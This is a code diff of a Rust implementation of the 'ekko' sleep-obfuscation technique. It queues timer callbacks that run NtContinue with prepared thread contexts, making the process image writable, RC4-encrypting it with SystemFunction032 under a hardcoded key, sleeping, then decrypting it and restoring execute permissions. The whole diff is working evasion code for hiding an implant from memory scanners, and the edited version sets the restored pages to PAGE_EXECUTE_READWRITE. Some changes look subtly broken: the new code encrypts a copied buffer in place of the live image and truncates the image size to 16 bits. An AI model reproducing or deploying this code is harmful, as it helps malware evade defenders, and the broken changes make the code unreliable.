@@ -1,15 +1,14 @@
-use ntapi::{ntxcapi::NtContinue};
+use ntapi::{ntxcapi::NtContinue, winapi::shared::ntdef::NTSTATUS};
 use std::{
     ffi::c_void,
-    mem::zeroed,
     ptr::{null, null_mut},
 };
 use windows_sys::Win32::{
     Foundation::{HANDLE, UNICODE_STRING, BOOLEAN, GetLastError},
     System::{
         Diagnostics::Debug::{IMAGE_NT_HEADERS64, RtlCaptureContext, CONTEXT},
-        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
-        Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READ},
+        LibraryLoader::{GetModuleHandleA},
+        Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_EXECUTE_READWRITE, PAGE_READWRITE},
         SystemServices::IMAGE_DOS_HEADER,
         Threading::{
             CreateEventW, CreateTimerQueue, CreateTimerQueueTimer, DeleteTimerQueue, SetEvent,
@@ -25,24 +24,22 @@ pub unsafe extern "system" fn call_rtl_capture_context(param0: *mut c_void, _par
     RtlCaptureContext(param0.cast());
 }
 
+/* 
 pub unsafe extern "system" fn call_nt_continue(param0: *mut c_void, _param1: BOOLEAN) {
     // You can use NtContinue after processing exception for continue executing thread. System uses NtContinue also in APC processing.
     // http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html
     //https://doxygen.reactos.org/d6/d9e/include_2reactos_2wine_2winternl_8h.html#ac28b5db9f434d0762d6bebc7dcdd608f
     NtContinue(param0.cast(), 0);
 }
+*/
+
+extern "system" {
+    fn SystemFunction032(data: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> NTSTATUS;
+}
 
 pub fn ekko(sleep_time: u32) {
     let mut h_new_timer: HANDLE = 0;
     let mut old_protect: u32 = 0;
-
-    // This can be a randomly generated key
-    let mut key_buf: [i8; 16] = [
-        0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55,
-        0x55,
-    ];
-    let mut key: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };
-    let mut img: UNICODE_STRING = unsafe { zeroed::<UNICODE_STRING>() };
 
     // Creates or opens a named or unnamed event object.
     // https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventw
@@ -66,19 +63,6 @@ pub fn ekko(sleep_time: u32) {
         });
     }
 
-    let sys_func032 = unsafe {
-        GetProcAddress(
-            LoadLibraryA("Advapi32.dll\0".as_ptr()),
-            "SystemFunction032\0".as_ptr(),
-        )
-    };
-
-    if sys_func032.is_none() {
-        panic!("[!] SystemFunction032 not found");
-    }
-
-    log::info!("[+] SystemFunction032: {:#x}", sys_func032.unwrap() as u64);
-
     let image_base = unsafe { GetModuleHandleA(null_mut()) };
     let dos_header = image_base as *mut IMAGE_DOS_HEADER;
     let nt_headers =
@@ -88,13 +72,20 @@ pub fn ekko(sleep_time: u32) {
     log::info!("[+] Image Base: {:#x}", image_base as u64);
     log::info!("[+] Image Size: {:#x}", image_size as u64);
 
-    key.Buffer = key_buf.as_mut_ptr() as *mut u16;
-    key.Length = key_buf.len() as u16; // 16
-    key.MaximumLength = key_buf.len() as u16; // 16
+    let mut secret = "1234567890ABCDEF\0".as_bytes().to_vec();
+    let key = UNICODE_STRING {
+        Length: secret.len() as u16,
+        MaximumLength: secret.len() as u16,
+        Buffer: secret.as_mut_ptr() as *mut u16,
+    };
 
-    img.Buffer = image_base as *mut u16;
-    img.Length = image_size as u16;
-    img.MaximumLength = image_size as u16;
+    let mut image_buffer: Vec<u8> = unsafe { std::slice::from_raw_parts_mut(image_base as *mut u8, image_size as _).to_vec() };
+
+    let mut data = UNICODE_STRING {
+        Length: image_buffer.len() as u16,
+        MaximumLength: image_buffer.len() as u16,
+        Buffer: image_buffer.as_mut_ptr() as *mut u16,
+    };
 
     log::info!("[+] Calling CreateTimerQueueTimer with ctx_thread");
     pause();   
@@ -146,7 +137,7 @@ pub fn ekko(sleep_time: u32) {
     rop_prot_rw.Rip = VirtualProtect as u64;
     rop_prot_rw.Rcx = image_base as *const c_void as u64;
     rop_prot_rw.Rdx = image_size as u64;
-    rop_prot_rw.R8 = PAGE_EXECUTE_READ as u64;
+    rop_prot_rw.R8 = PAGE_READWRITE as u64;
     rop_prot_rw.R9 = &mut old_protect as *mut PAGE_PROTECTION_FLAGS as u64;
     dump_virtual_protect_context(&rop_prot_rw);
 
@@ -154,9 +145,9 @@ pub fn ekko(sleep_time: u32) {
     // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
     // pub unsafe extern "system" fn SystemFunction032(randombuffer: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> BOOLEAN
     rop_mem_enc.Rsp -= 8;
-    rop_mem_enc.Rip = sys_func032.unwrap() as u64;
-    rop_mem_enc.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
-    rop_mem_enc.Rdx = &key as *const UNICODE_STRING as *const c_void as u64;
+    rop_mem_enc.Rip = SystemFunction032 as u64;
+    rop_mem_enc.Rcx = &mut data as *mut _ as u64;
+    rop_mem_enc.Rdx = &key as *const _ as u64;
     dump_system_function032_context(&rop_mem_enc);
 
     // pub unsafe extern "system" fn WaitForSingleObject(hhandle: HANDLE, dwmilliseconds: u32) -> WIN32_ERROR
@@ -171,9 +162,9 @@ pub fn ekko(sleep_time: u32) {
     // NTSTATUS WINAPI SystemFunction032(struct ustring *data, const struct ustring *key)
     // pub unsafe extern "system" fn SystemFunction032(randombuffer: *mut UNICODE_STRING, key: *const UNICODE_STRING) -> BOOLEAN
     rop_mem_dec.Rsp -= 8;
-    rop_mem_dec.Rip = sys_func032.unwrap() as u64;
-    rop_mem_dec.Rcx = &mut img as *mut UNICODE_STRING as *mut c_void as u64;
-    rop_mem_dec.Rdx = &key as *const UNICODE_STRING as *const c_void as u64;
+    rop_mem_dec.Rip = SystemFunction032 as u64;
+    rop_mem_dec.Rcx = &mut data as *mut _ as u64;
+    rop_mem_dec.Rdx = &key as *const _ as u64;
     dump_system_function032_context(&rop_mem_dec);
 
     // pub unsafe extern "system" fn VirtualProtect(lpaddress: *const c_void, dwsize: usize, flnewprotect: PAGE_PROTECTION_FLAGS, lpfloldprotect: *mut PAGE_PROTECTION_FLAGS) -> BOOL
@@ -182,7 +173,7 @@ pub fn ekko(sleep_time: u32) {
     rop_prot_rx.Rip = VirtualProtect as u64;
     rop_prot_rx.Rcx = image_base as *const c_void as u64;
     rop_prot_rx.Rdx = image_size as u64;
-    rop_prot_rx.R8 = PAGE_EXECUTE_READ as u64;
+    rop_prot_rx.R8 = PAGE_EXECUTE_READWRITE as u64;
     rop_prot_rx.R9 = &mut old_protect as *mut u32 as u64;
     dump_virtual_protect_context(&rop_prot_rx);
 
@@ -196,11 +187,14 @@ pub fn ekko(sleep_time: u32) {
     log::info!("[+] Rop chain built");
     log::info!("[+] Queue timers");
 
+    type WaitOrTimerCallbackFn = unsafe extern "system" fn(param0: *mut c_void, param1: BOOLEAN);
+    let ntcontinue: WaitOrTimerCallbackFn = unsafe { std::mem::transmute::<_, WaitOrTimerCallbackFn>(NtContinue as *mut u64) };
+
     let result = unsafe {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_prot_rw as *const _ as *const _,
             100,
             0,
@@ -218,7 +212,7 @@ pub fn ekko(sleep_time: u32) {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_mem_enc as *const _ as *const _,
             200,
             0,
@@ -236,7 +230,7 @@ pub fn ekko(sleep_time: u32) {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_delay as *const _ as *const _,
             300,
             0,
@@ -254,7 +248,7 @@ pub fn ekko(sleep_time: u32) {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_mem_dec as *const _ as *const _,
             400,
             0,
@@ -272,7 +266,7 @@ pub fn ekko(sleep_time: u32) {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_prot_rx as *const _ as *const _,
             500,
             0,
@@ -290,7 +284,7 @@ pub fn ekko(sleep_time: u32) {
         CreateTimerQueueTimer(
             &mut h_new_timer,
             h_timer_queue,
-            Some(call_nt_continue),
+            Some(ntcontinue),
             &rop_set_evt as *const _ as *const _,
             600,
             0,
@@ -305,13 +299,13 @@ pub fn ekko(sleep_time: u32) {
         );
     }
 
-    log::info!("[+] Waiting for event...");
+    //log::info!("[+] Waiting for event...");
 
     unsafe {
         WaitForSingleObject(h_event, INFINITE);
     } //0xFFFFFFFF
 
-    log::info!("[+] Finished waiting for event");
+    //log::info!("[+] Finished waiting for event");
 
     // Deletes a timer queue. Any pending timers in the queue are canceled and deleted.
     // https://learn.microsoft.com/en-us/windows/win32/api/threadpoollegacyapiset/nf-threadpoollegacyapiset-deletetimerqueue
